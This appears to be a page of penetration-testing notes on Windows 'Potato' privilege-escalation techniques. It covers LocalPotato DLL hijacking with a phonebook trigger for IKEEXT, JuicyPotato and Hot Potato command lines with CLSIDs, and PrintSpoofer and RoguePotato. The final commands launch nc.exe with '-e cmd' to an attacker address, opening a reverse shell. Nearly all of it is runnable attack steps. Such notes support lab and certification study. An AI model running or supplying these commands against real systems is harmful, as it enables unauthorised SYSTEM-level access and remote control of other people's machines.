---
title: Potato
parent: Method (Windows)
layout: default
nav_order: 6
---

## Local Potato (DLL Injection)
Windows 10: `WptsExtensions.dll` (THIS WILL BREAK SYSTEM, USE WITH CARE!)\
WIndows 7 (can on others too if can put in system32): `wlbsctrl.dll`

If you can use LocalPotato on Win 10+, first create the malicious wlbsctrl.dll. Then copy it to system32 folder. IKEEXT might not be automatic so useless even if you can restart. A way to do this is to create the following and name it try.pbk:

try.pbk
```
[IKEEXT]
MEDIA=rastapi
Port=VPN2-0
Device=Wan Miniport (IKEv2)
DEVICE=vpn
PhoneNumber=127.0.0.1
```

Subsequently, use the following command:\
`rasdial IKEEXT test test /PHONEBOOK:try.pbk`

## Rotten / Juicy Potato
1. First run `whoami /priv` to check privilege (make sure have SeAssignPrimaryToken or SeImpersonate).
2. Run the following after transferring juicypotato and shell executable:\
   `JuicyPotato.exe -t * -p C:\Users\Public\shell.exe -l 5837`\
   (-t can set to t or u, l is arbritary port number, p is the shell executable)
3. If CLSID fails can try point 5 in alternative method below, or https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
4. When the Windows version is Windows Server 2019 or Windows 10 build 1809 onwards, this will not work, use PrintSpoofer / RoguePotato instead.

Alternative:
1. Run `whoami /priv` to check the privilege.
2. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows.
3. Start a listener on Kali. Use a service account (or account with SeImpersonate or SeAssignPrimaryToken): `PSExec64.exe -accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
4. Start another listener for Kali. Run `JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d- 49b8-abc6-03dd84127020}`
5. If the CLSID dont work use `https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md` or run GetCLSID.ps1 from the link.


## Hot Potato
1. Copy the potato.exe to the victim
2. Start listener, then run this: `potato.exe -ip LocalIP -cmd "C:\PrivEsc\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true`
3. Windows Server 2008 (final parameter is wpad.domain.tld):\
   `Potato.exe -ip LocalIP -cmd "C:\PrivEsc\reverse.exe" -disable_exhaust true -disable_defender true -spoof_host WPAD.EMC.LOCAL`
4. Wait for a Windows defender update or manually trigger one. (Win Server 2008: Windows Update)

## PrintSpoofer/RoguePotato
Windows Server 2019 and Windows 10 build 1809 onwards

1. PrintSpoofer:\
   `PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"`
2. RoguePotato:\
   `RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999`